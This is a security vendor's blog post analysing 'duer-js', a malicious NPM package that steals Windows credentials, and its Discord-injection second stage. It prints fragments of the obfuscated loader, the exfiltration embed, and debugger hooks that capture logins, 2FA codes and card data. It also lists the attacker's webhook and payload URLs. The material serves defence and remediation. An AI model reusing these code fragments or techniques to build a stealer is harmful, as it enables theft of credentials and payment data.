---
excerpt: The JFrog security research team recently uncovered a sophisticated malicious package called "duer-js" published on NPM by the user "luizaearlyx". After complex analysis, the package was identified as an advanced windows targeted information stealer, self-named as “bada stealer”. The package remains active as of this publication.
title: How a Complex Multi Payload Infostealer Hid in NPM Disguised as 'Console Visibility'
date: "February 11, 2026"
description: "Guy Korolevski, JFrog Security Researcher"
tag: "Real Time Post"
img: /img/RealTimePostImage/post_thumbnail1.png
type: realTimePost
minutes: '9'

---

The JFrog security research team recently uncovered a sophisticated malicious package called `duer-js` published on NPM by the user `luizaearlyx`. After complex analysis, the package was identified as an advanced windows targeted information stealer, self-named as **“bada stealer”**. The package remains active as of this publication.

![](/img/RealTimePostImage/post/duer-js-package/image1.png)

In addition to stealing information from the host it infected, the malicious package downloads a secondary payload. This payload is designed to run on Discord Desktop app startup, with self updating capabilities, stealing directly from it, including payment methods used by the user.

The solution of **simply uninstalling the package is not enough in this case**. In this article we dive into the obfuscation methods and a detailed analysis of the malicious package, including remediation steps for compromised endpoints.

## String Decoding Walk-Through

![](/img/RealTimePostImage/post/duer-js-package/image2.png)  
*Strings decoding process in the package stages*

The package lists `index.js` as the main, when inspecting it (pretty printed) we immediately noticed a very long line wrapped in `eval()`, with length of almost 64 thousand characters. 

```javascript
//Make console version more visible :: By Luisa | Other Version code is on GitHub
let fx4sb;
!function() {
    const var_12 = Array.prototype.slice.call(arguments);
    return eval("(function sykF(bOrx){const Dlux=nVyv(bOrx,Ddmv(sykF.toString()))....%19%1A%09AWX%17%14E\")");
}();
const whPE = require(fx4sb.zMOqb(0));
const YiSE = require(fx4sb.ruwob(1));
const YCFF = require(fx4sb.HMjob(2));
const AEIF = require(fx4sb.HMjob(2));
const UzzF = require(fx4sb.DJLob(3));
const wBCF = require(fx4sb.vB8ob(4));
const QwtF = require(fx4sb.nrYob(5));
const { [fx4sb.LVspb(6)]: sywF, [fx4sb.joqpb(7)]: MtnF } = require(fx4sb.zMOqb(8));
...
```

*Pretty printed code snippet from index.js entry point*

Extracting and pretty printing the string from the long line immediately revealed that the code has anti-tempering protection in place for the enthusiastic researchers who might modify and run it. Researchers must bypass or disable the anti-tempering in order to run the malicious code, which is exactly what the attacker wants, higher complexity for analysis:

```javascript
const Dlux = nVyv(bOrx, Ddmv(sykF.toString()));
console.log(Dlux);
try {
    let fLov = eval(Dlux);
    return fLov.apply(null, YUFk);
} catch (Hirv) {
    var bGjv = (0o202354 - 66782);
    while (bGjv < (0o400140 % 65566)) switch (bGjv) {
        case (0x3005F % 0o200033):
            bGjv = Hirv instanceof SyntaxError ? (0o400103 % 0x1001B) : (0o400142 % 0x1001F);
            break;
        case (0o200606 - 0x10179):
            bGjv = (0o400156 % 65573);
            {
                console.log('Error: the code has been tampered!');
                return
            }
            break;
    }
    throw Hirv;
}
```

At the end of the long line we found a URI-encoded string, which is passed as an argument to subsequent functions, the decoded string then undergoes an XOR mechanism with a key that is evaluated at run time. 

After initial decoding, another evaluation is performed on the decoded value, which is yet again URI-encoded and XORed. However, this time it contains an array with highly unique values:  
![](/img/RealTimePostImage/post/duer-js-package/image3.png)  
*Raw conversion table as seen in the second stage of decoding strings*

This array is the string table that is hidden under the layers of obfuscation. The second payload is decoding the entire array with XOR key `11`, giving us the strings conversion table used in the original `index.js`.  A simple replacement of functions that resolve the strings, with their actual value, yielded a version of the malware, very close to the original source code.

![](/img/RealTimePostImage/post/duer-js-package/image4.png)  
*Comparison of payload before and after resolving strings*

## Initial Payload analysis

The malware kills browsers and telegram processes before proceeding to information stealing, the following information is exfiltrated:

1. Discord  
* Tokens from Discord installs (Local Storage / leveldb) under `%APPDATA%` and `%LOCALAPPDATA%` (discord, discordcanary, discordptb, discorddevelopment, lightcord).  
* Per-token: user info (`/users/@me`), Nitro type, billing/payment sources (`/billing/payment-sources`), friends, guilds, 2FA backup codes (searches for `discord_backup_codes` in user dirs and exfiltrates them).  
2. Browsers (Chrome, Edge, Brave, Opera, Yandex)  
* Passwords from `passwords.db` / Login Data (decrypted via DPAPI where used).  
* Cookies from `Network\Cookies` and `Network\LxnyCookies`.  
* Autofill / credit cards from Web Data (e.g. `name_on_card`, `card_number_encrypted`, `expiration_month/year`).  
* Paths cover Default \+ Profile 1–5 \+ Guest for each browser; also “Wallets” cookie dirs and extension data for multiple crypto wallets (Exodus, BraveWallet, MetaMask-style, etc.).  
3. Crypto wallets  
* Exodus: zips `%APPDATA%\Exodus\exodus.wallet` and uploads as `Exodus.zip`.  
* Many browser-extension wallets are listed by name (BraveWallet, AtomicWallet, etc.) via their Local/Sync Extension Settings paths.  
4. Other  
* Steam: zips `C:\Program Files (x86)\Steam\config` and uploads as `steam.zip`.  
* System/info: hostname, OS version, uptime, RAM, CPU count, username, temp dir, cwd, IP (from myexternalip.com).

```javascript
["author"]: { ["name"]: `${process["env"]["USERNAME"]}${" | Browsers Data"}` },
["fields"]: [
    {
        ["name"]: "Cookies",
        ["value"]: `${"\\`"}${var_474}${"\\`"}`,
        ["inline"]: true
    },
    {
        ["name"]: "Passwords",
        ["value"]: `${"\\`"}${var_501}${"\\`"}`,
        ["inline"]: true
    },
    {
        ["name"]: "Credit Cards",
        ["value"]: `${"\\`"}${var_515}${"\\`"}`,
        ["inline"]: true
    },
    {
        ["name"]: "Autofills",
        ["value"]: `${"\\`"}${var_507}${"\\`"}`,
        ["inline"]: true
    },
    {
        ["name"]: "Wallets",
        ["value"]: `${"\\`"}${var_520}${"\\`"}`,
        ["inline"]: true
    },
    {
        ["name"]: "Steam",
        ["value"]: `${"\\`"}${var_521}${"\\`"}`,
        ["inline"]: true
    },
    {
        ["name"]: "\u200b",
        ["value"]: `${"[Cookies]("}${var_496}${"), [Passwords]("}${var_498}${"), [Credit-Cards]("}${var_512}${"), [AutoFills]("}${var_504}${") "}${var_518}${" "}${var_519}`
    }
],
["footer"]: { ["text"]: "Bada Stealer" }
};

```

### Data exfiltration and failed persistence attempt

The malware writes `Passwords.txt`, `Cards.txt`, `Autofills.txt` under a “copyright” path, then uploads them; cookies/passwords/credit-cards/autofills (and optional Exodus/Steam links).  
Data is exfiltrated directly into a discord webhook, with a secondary backup exfiltration method via Gofile server, it gets a server address from `https://api.gofile.io/servers`, then uploads the content into `https://<server>.gofile.io/uploadFile`.

While this is a legitimate service, this method enables the attacker to upload the exfiltrated data to a remote storage, and then retrieve it later. Uploading to a gofile server returns to the user a download url, for later download. The attacker sends that download url to the discord webhook to download later.

Furthermore, the malware **attempts** to get persistence by copying the node.exe executable into `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\<original exe name>`  
However, since the `node.exe` executable only runs the js file, simply placing it in the startup directory will yield no results, and fail to achieve persistence.

## Second payload analysis \- Hijacking Discord’s Electron environment

![](/img/RealTimePostImage/post/duer-js-package/image5.png)  
*`duer-js` malicious package flow*

The initial payload downloads a secondary payload from `hxxps[:]//ghostbin[.]axel[.]org/paste/yckfb/raw`, which is yet another js obfuscated in the exact same method as before, with URI-escaping, dynamic evals and XORs.   
Once again resolving all strings is very similar, and we got a decoded version of the malware:  
![](/img/RealTimePostImage/post/duer-js-package/image6.png)  
*Second payload comparison before and after decoding strings*

The original malicious code in `index.js` finds the discord app dirs under `%LOCALAPPDATA%`, then proceeds to overwrite that `index.js` with the fetched payload. So that when the user opens Discord, the injected code runs, and can report “**Successfully Injected**” to the same exfiltration webhook of the first payload.

### What does this payload do? 

The payload's primary purpose is to hijack the **Electron environment** of the Discord desktop application. It achieves this by attaching a debugger to the client's internal web contents to intercept sensitive network traffic as it happens.

The core functionality of the payload is to use the `webContents.debugger` API to hook into Discord's network stack, it listens for `Network.responseReceived` events. And capture by the URL filters:

* `/login`, `/register`: To capture new credentials.  
* `/mfa/totp`, `/mfa/codes-verification`: To bypass Two-Factor Authentication by capturing verification codes and backup codes in real-time.  
* `/@me`: To monitor account changes (email or password updates).

```javascript
mainWindow["webContents"]["debugger"]["attach"]("1.3");
    mainWindow["webContents"]["debugger"]["on"]("message", async (sicr, Ujfr, ofWq) => {...}
```

When such an event occurs, it uses `Network.getResponseBody` and `Network.getRequestPostData` to pull the plaintext email, password, and the newly generated session token directly from the memory of the Discord client.

```javascript
case ofWq["response"]["url"]["endsWith"]("/login"):
    var Aoor = N0wbb["YiAH"]();
    while (Aoor < N0wbb["oBnH"]()) switch (Aoor) {
        case (0x75bcd15 - 0O726746425):
            Aoor = !kwDr["token"] ? N0wbb["sGsH"]() : N0wbb["oBnH"]();
            break;
        case (0O57060516 - 0xbc614d):
            Aoor = N0wbb["oBnH"](); {
                YOmu = gtxr["login"];
                sKdu = gtxr["password"];
                return;
            }
            break;
    }
    UfUu(gtxr["login"], gtxr["password"], kwDr["token"], "logged in");
    break;
case ofWq["response"]["url"]["endsWith"]("/register"):
    UfUu(gtxr["email"], gtxr["password"], kwDr["token"], "signed up");
    break;
case ofWq["response"]["url"]["endsWith"]("/totp"):
    UfUu(YOmu, sKdu, kwDr["token"], "logged in with 2FA");
    break;
case ofWq["response"]["url"]["endsWith"]("/codes-verification"):
    kYEu(kwDr["backup_codes"], await gFOz());
    break;
case ofWq["response"]["url"]["endsWith"]("/@me"):
```

The injected payload also attempts to hijack payments, capturing live payments to external services and exfiltrate data of **Credit Card Number, CVC, and Expiry Date** before they are even sent to the legitimate server.  
All of the data is exfiltrated to the same discord webhook as the first stage of the malicious package.

```javascript
case YGYr["url"]["endsWith"]("tokens"):
    const QAMr = Uvwz["parse"](Buffer["from"](YGYr["uploadData"][(0x75bcd15 - 0O726746425)]["bytes"])["toString"]());
    ovyv(QAMr["card[number]"], QAMr["card[cvc]"], QAMr["card[exp_month]"], QAMr["card[exp_year]"], await gFOz());
    break;
case YGYr["url"]["endsWith"]("paypal_accounts"):
    EHWv(await gFOz());
    break;
```

In this payload as well, we see attempts of persistence, with the capability to **self update** based on github repo \- `https[:]//raw[.]githubusercontent[.]com/xSalca/Viral/main/index[.]js`

Observing the repo and it’s files shows a slightly different version, that was created 2 years ago, and updated last year:  
![](/img/RealTimePostImage/post/duer-js-package/image7.png)

## Remediation

Affected users who installed this package should:

- Uninstall the malicious package `npm uninstall duer-js`  
- Revoke and rotate stolen secrets  
  - Browser passwords, cookies, and (from the code) can target crypto wallets (e.g. Exodus) and Steam  
- Discord autorun removal:  
  - Close Discord fully  
  - Uninstall Discord from Windows Settings (or Control Panel)  
  - Delete the app data folder so the infected file is gone:  
    - Press \`Win \+ R\`, type `%LOCALAPPDATA%`, Enter.  
    - Delete the folder(s): Discord, DiscordPTB, DiscordCanary (whichever you had).  
    - Download and install the official installation  
- Remove node.exe from startup folder  
- Assume your discord token was stolen \- invalidate it  
  - Enable 2FA if you have not already.

## Conclusions

![](/img/RealTimePostImage/post/duer-js-package/image8.png)  
Although the malicious package has a low download count of only 528, its potential impact on affected individuals is high. With obfuscation, multi payload stages and complex mechanisms to exfiltrate data, it is a bit more unique from the everyday malware we see in NPM.   
Furthermore, the existence of the repo on Github for more than 2 years, suggests that other attempts of infection may have occurred before we got to the malicious package and traced it back to the repo, leaving us only to wonder \- who is Luisa?

This package is already detected by JFrog Xray and JFrog Curation, under the Xray ID listed in the IoC section below.

## IOC

* `hxxps[:]//discord[.]com/api/webhooks/1455324432548499496/6oMVbi2PYDxrBiOtHe2tpBSUOdBJpz2RDEiwLkHUqeqJbgIPiONHafMP5tHXYjAVK2R3`
* `hxxps[:]//ghostbin[.]axel[.]org/paste/yckfb/raw`  
* `https\[:]//raw\[.]githubusercontent\[.]com/xSalca/Viral/main/index[.]js`
* Github user \- [https://github.com/xSalca/](https://github.com/xSalca/)  
* Github repo \- [https://github.com/xSalca/Viral](https://github.com/xSalca/Viral)  
* NPM package \- [`duer-js`](https://www.npmjs.com/package/duer-js?activeTab=code) \- XRAY-938808  
* NPM user \- `luizaearlyx`  
* Second payload hash \- a91dd2e6a5ab21b8dd3bac7fc9be928b0764075fa71e33bc5ecd2f237b1f82c3
